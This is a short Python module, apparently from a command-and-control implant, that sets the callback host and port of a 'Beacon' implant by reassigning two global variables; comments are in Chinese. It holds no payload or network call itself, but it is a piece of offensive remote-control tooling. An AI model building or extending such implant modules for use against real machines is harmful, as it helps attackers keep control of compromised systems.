"""
@module: set_host
@desc: 修改 Beacon 回连地址和端口
@contract: 依赖 implant 全局变量 _H/_P (5.5/D2)
"""
MODULE = {
    "desc": "修改 Beacon 回连地址和端口",
    "params": [("host", "必填"), ("port", "必填")],
}


def run(host, port):
    global _H, _P
    _H = host
    _P = int(port)
    return f"host={_H}, port={_P}"


if __name__ == "__main__":
    print("usage: set_host <host> <port>")
